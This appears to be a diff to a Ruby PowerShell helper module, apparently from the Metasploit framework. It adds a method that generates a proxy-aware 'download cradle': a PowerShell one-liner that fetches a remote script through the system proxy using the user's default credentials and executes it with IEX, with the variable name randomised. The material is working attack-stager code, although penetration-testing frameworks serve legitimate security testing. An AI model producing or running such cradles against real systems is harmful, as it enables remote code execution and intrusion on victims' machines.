@@ -72,6 +72,22 @@ module Powershell
     def self.ignore_ssl_certificate
       '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
     end
+
+    #
+    # Use the default system web proxy and credentials to download a URL
+    # as a string and execute the contents as PowerShell
+    #
+    # @param url [String] string to download
+    #
+    # @return [String] PowerShell code to download a URL
+    def self.proxy_aware_download_and_exec_string(url)
+      var = Rex::Text.rand_text_alpha(1)
+      cmd = "$#{var}=new-object net.webclient;"
+      cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
+      cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
+      cmd << "IEX $#{var}.downloadstring('#{url}');"
+      cmd
+    end
   end
 end
 end
